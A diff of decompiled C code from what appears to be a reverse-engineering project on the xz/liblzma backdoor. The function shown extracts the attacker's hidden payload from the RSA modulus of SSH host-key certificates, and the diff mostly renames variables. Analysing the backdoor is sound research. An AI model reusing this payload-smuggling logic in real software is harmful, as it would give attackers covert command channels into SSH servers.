@@ -2,10 +2,11 @@
 // Function: extract_payload_message @ 0x107F20
 // Calling convention: __stdcall
 // Prototype: BOOL __stdcall extract_payload_message(sshbuf * sshbuf_data, size_t sshbuf_size, size_t * out_payload_size, global_context_t * ctx)
+
+
 /*
  * AutoDoc: Parses an sshbuf blob to locate the RSA modulus portion, updating the buffer pointer and reporting its length. The command decoder uses it to peel the attacker payload out of host-key certificates carried over the monitor channel.
  */
-
 #include "xzre_types.h"
 
 
@@ -16,19 +17,24 @@ BOOL extract_payload_message
 {
   uint *puVar1;
   char cVar2;
-  uint uVar3;
-  size_t i;
-  size_t cert_type_namelen;
-  u32 length_1;
-  u32 length_2;
-  u32 length;
-  uint *puVar4;
-  size_t remaining;
-  long lVar5;
-  u8 *modulus_data;
-  uint *puVar6;
+  u8 *puVar3;
+  ulong uVar4;
+  uint *puVar5;
+  uint uVar6;
+  long lVar7;
+  u8 *str;
+  uint *puVar8;
+  ulong max_len;
   size_t modulus_length;
+  u8 *modulus_data;
+  size_t cert_type_namelen;
+  size_t remaining;
   u8 *sshbuf_end;
+  u8 *data_end;
+  u32 length;
+  u8 *p;
+  char *cert_type;
+  size_t i;
   
   if ((sshbuf_data == (sshbuf *)0x0) || (sshbuf_size < 7)) {
     return 0;
@@ -40,76 +46,75 @@ BOOL extract_payload_message
     if (ctx->STR_rsa_sha2_256 == (char *)0x0) {
       return 0;
     }
-    sshbuf_end = sshbuf_data->d;
-    if (CARRY8((ulong)sshbuf_end,sshbuf_size)) {
+    puVar3 = sshbuf_data->d;
+    if (CARRY8((ulong)puVar3,sshbuf_size)) {
       return 0;
     }
-    i = 0;
+    uVar4 = 0;
     do {
-      modulus_data = sshbuf_end + i;
-      remaining = 0;
-      modulus_length = sshbuf_size - i;
+      str = puVar3 + uVar4;
+      lVar7 = 0;
+      max_len = sshbuf_size - uVar4;
       while( true ) {
-        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[remaining];
-        if (((char)modulus_data[remaining] < cVar2) || (cVar2 < (char)modulus_data[remaining]))
-        break;
-        remaining = remaining + 1;
-        if (remaining == 7) goto LAB_00107fd1;
+        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[lVar7];
+        if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
+        lVar7 = lVar7 + 1;
+        if (lVar7 == 7) goto LAB_00107fd1;
       }
-      lVar5 = 0;
+      lVar7 = 0;
       while( true ) {
-        cVar2 = ctx->STR_rsa_sha2_256[lVar5];
-        if (((char)modulus_data[lVar5] < cVar2) || (cVar2 < (char)modulus_data[lVar5])) break;
-        lVar5 = lVar5 + 1;
-        if (lVar5 == 7) goto LAB_00107fd1;
+        cVar2 = ctx->STR_rsa_sha2_256[lVar7];
+        if (((char)str[lVar7] < cVar2) || (cVar2 < (char)str[lVar7])) break;
+        lVar7 = lVar7 + 1;
+        if (lVar7 == 7) goto LAB_00107fd1;
       }
-      i = i + 1;
-    } while (sshbuf_size - i != 6);
-    modulus_data = (u8 *)0x0;
-    modulus_length = 6;
+      uVar4 = uVar4 + 1;
+    } while (sshbuf_size - uVar4 != 6);
+    str = (u8 *)0x0;
+    max_len = 6;
 LAB_00107fd1:
-    if ((7 < i) && (modulus_data != (u8 *)0x0)) {
-      uVar3 = *(uint *)(modulus_data + -8);
-      length_1 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
-      if (0x10000 < length_1) {
+    if ((7 < uVar4) && (str != (u8 *)0x0)) {
+      uVar6 = *(uint *)(str + -8);
+      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
+      if (0x10000 < uVar6) {
         return 0;
       }
-      puVar1 = (uint *)(modulus_data + ((ulong)length_1 - 8));
-      if (sshbuf_end + sshbuf_size < puVar1) {
+      puVar1 = (uint *)(str + ((ulong)uVar6 - 8));
+      if (puVar3 + sshbuf_size < puVar1) {
         return 0;
       }
-      cert_type_namelen = c_strnlen((char *)modulus_data,modulus_length);
-      if (modulus_length <= cert_type_namelen) {
+      uVar4 = c_strnlen((char *)str,max_len);
+      if (max_len <= uVar4) {
         return 0;
       }
-      puVar6 = (uint *)(modulus_data + cert_type_namelen);
-      if (puVar1 <= puVar6) {
+      puVar8 = (uint *)(str + uVar4);
+      if (puVar1 <= puVar8) {
         return 0;
       }
-      uVar3 = *puVar6;
-      length_2 = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
-      if (0x10000 < length_2) {
+      uVar6 = *puVar8;
+      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
+      if (0x10000 < uVar6) {
         return 0;
       }
-      puVar6 = (uint *)((long)puVar6 + (ulong)(length_2 + 4));
-      if (puVar1 <= puVar6) {
+      puVar8 = (uint *)((long)puVar8 + (ulong)(uVar6 + 4));
+      if (puVar1 <= puVar8) {
         return 0;
       }
-      uVar3 = *puVar6;
-      length = uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18;
-      if (0x10000 < length) {
+      uVar6 = *puVar8;
+      uVar6 = uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18;
+      if (0x10000 < uVar6) {
         return 0;
       }
-      puVar4 = puVar6 + 1;
-      if ((uint *)((ulong)length + (long)puVar4) <= puVar1) {
+      puVar5 = puVar8 + 1;
+      if ((uint *)((ulong)uVar6 + (long)puVar5) <= puVar1) {
         return 0;
       }
-      if ((char)puVar6[1] == '\0') {
-        puVar4 = (uint *)((long)puVar6 + 5);
-        length = length - 1;
+      if ((char)puVar8[1] == '\0') {
+        puVar5 = (uint *)((long)puVar8 + 5);
+        uVar6 = uVar6 - 1;
       }
-      sshbuf_data->d = (u8 *)puVar4;
-      *out_payload_size = (ulong)length;
+      sshbuf_data->d = (u8 *)puVar5;
+      *out_payload_size = (ulong)uVar6;
       return 1;
     }
   }
